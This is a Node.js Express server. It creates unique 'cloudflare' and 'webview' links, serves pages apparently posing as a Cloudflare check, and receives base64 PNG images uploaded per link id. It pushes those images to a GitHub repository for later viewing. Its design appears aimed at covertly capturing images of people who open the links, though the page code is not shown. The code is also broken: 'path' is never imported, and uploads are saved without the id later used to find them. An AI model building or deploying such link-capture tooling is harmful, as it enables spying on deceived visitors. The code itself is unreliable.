const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const { v4: uuidv4 } = require('uuid');
const app = express();

require('dotenv').config();

// Middleware
app.use(bodyParser.json({ limit: '10mb' }));
app.use(bodyParser.urlencoded({ extended: true }));

// Database connection
mongoose.connect(process.env.DB_URI, { useNewUrlParser: true, useUnifiedTopology: true })
    .then(() => console.log('MongoDB connected'))
    .catch(err => console.log(err));

// Model
const Url = require('./models/Url');

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// Routes
app.post('/generate', (req, res) => {
    const uniqueId = uuidv4();
    const cloudflareUrl = `https://yourapp.herokuapp.com/c/${uniqueId}`;
    const webViewUrl = `https://yourapp.herokuapp.com/w/${uniqueId}`;

    const newUrl = new Url({ url: req.body.url, uniqueId });
    newUrl.save().then(() => res.json({ cloudflareUrl, webViewUrl }));
});

app.get('/c/:id', (req, res) => {
    const id = req.params.id;
    res.sendFile(path.join(__dirname, 'public', 'cloudflare.html'));
});

app.get('/w/:id', (req, res) => {
    const id = req.params.id;
    res.sendFile(path.join(__dirname, 'public', 'webview.html'));
});

app.post('/upload/:id', async (req, res) => {
    const id = req.params.id;
    const imageData = req.body.image.replace(/^data:image\/png;base64,/, '');
    const imageBuffer = Buffer.from(imageData, 'base64');
    const imagePath = `uploads/${id}.png`;
    
    // Save the image to GitHub
    const githubToken = process.env.GITHUB_TOKEN;
    const repo = 'yourusername/yourrepo';  // Replace with your GitHub username and repository name
    const path = `uploads/${id}.png`;
    const message = `Upload image for ${id}`;
    const content = imageBuffer.toString('base64');

    const response = await fetch(`https://api.github.com/repos/${repo}/contents/${path}`, {
        method: 'PUT',
        headers: {
            'Authorization': `token ${githubToken}`,
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            message,
            content
        })
    });

    if (response.ok) {
        const newUrl = new Url({ url: req.body.url, screenshot: imagePath });
        newUrl.save().then(() => res.sendStatus(200));
    } else {
        res.status(response.status).send(await response.text());
    }
});

app.get('/image/:id', async (req, res) => {
    const id = req.params.id;
    Url.findOne({ uniqueId: id })
        .then(url => {
            if (url && url.screenshot) {
                const githubToken = process.env.GITHUB_TOKEN;
                const repo = 'yourusername/yourrepo';  // Replace with your GitHub username and repository name
                const path = `uploads/${id}.png`;

                fetch(`https://api.github.com/repos/${repo}/contents/${path}`, {
                    headers: {
                        'Authorization': `token ${githubToken}`,
                        'Accept': 'application/vnd.github.v3.raw'
                    }
                })
                .then(response => response.buffer())
                .then(buffer => {
                    res.set('Content-Type', 'image/png');
                    res.send(buffer);
                })
                .catch(err => res.sendStatus(500));
            } else {
                res.sendStatus(404);
            }
        })
        .catch(err => res.sendStatus(500));
});

// Server setup
const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});
